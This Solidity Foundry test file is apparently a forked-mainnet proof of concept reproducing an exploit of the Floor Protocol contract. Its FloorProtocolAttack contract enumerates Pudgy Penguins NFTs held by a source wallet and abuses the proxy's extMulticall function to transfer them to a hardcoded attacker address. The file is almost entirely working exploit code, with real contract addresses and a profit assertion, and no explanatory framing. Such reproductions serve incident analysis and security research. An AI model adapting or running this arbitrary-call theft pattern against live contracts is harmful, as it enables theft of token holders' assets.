
pragma solidity ^0.8.20;

import {IERC721Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant TX_TIMESTAMP = 1702774151;
    uint256 constant TX_BLOCK_NUMBER = 18802289;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        FloorProtocolAttack attack = _deployAttack();
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (FloorProtocolAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = FloorProtocolAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new FloorProtocolAttack();
        }
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(FloorProtocolAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(ATTACKER_EOA, address(0), Addresses.PPG, "PPG", 36);
    }
}

contract FloorProtocolAttack {
    function attack() external payable {
        _collectPudgies();
    }

    function _collectPudgies() internal {
        IPudgyPenguins pudgyPenguins = IPudgyPenguins(Addresses.PPG);
        address sourceWallet = Addresses.PUDGY_SOURCE_WALLET;
        uint256 tokenCount = pudgyPenguins.balanceOf(sourceWallet);
        uint256[] memory tokenIds = new uint256[](tokenCount);

        for (uint256 index = 0; index < tokenCount; index++) {
            tokenIds[index] = pudgyPenguins.tokenOfOwnerByIndex(sourceWallet, index);
        }

        _transferPudgies(sourceWallet, Addresses.ATTACKER_EOA, tokenIds);
    }

    function _transferPudgies(address sourceWallet, address attacker, uint256[] memory tokenIds) internal {
        FloorCall[] memory calls = new FloorCall[](tokenIds.length);

        for (uint256 index = 0; index < tokenIds.length; index++) {
            calls[index] = FloorCall({
                target: Addresses.PPG,
                data: abi.encodeWithSelector(
                    IERC721Like.safeTransferFrom.selector, sourceWallet, attacker, tokenIds[index]
                )
            });
        }

        IFloorProtocol(Addresses.FLOOR_PROXY).extMulticall(calls);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x6306e50a) {
            _collectPudgies();
        }
    }
}

library Addresses {
    address internal constant FLOOR_PROXY = 0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE;
    address internal constant ATTACKER_EOA = 0x4d0D746E0F66bf825418E6b3deF1a46Ec3c0B847;
    address internal constant ATTACK_CONTRACT = 0x7E5433F02F4bf07C4f2a2D341C450E07d7531428;
    address internal constant PPG = 0xBd3531dA5CF5857e7CfAA92426877b022e612cf8;
    address internal constant PUDGY_SOURCE_WALLET = 0xe5442aE87E0fEf3F7cc43E507adF786c311a0529;
}

struct FloorCall {
    address target;
    bytes data;
}

interface IFloorProtocol {
    function extMulticall(FloorCall[] calldata calls) external;
}

interface IPudgyPenguins {
    function balanceOf(address owner) external view returns (uint256);
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
}
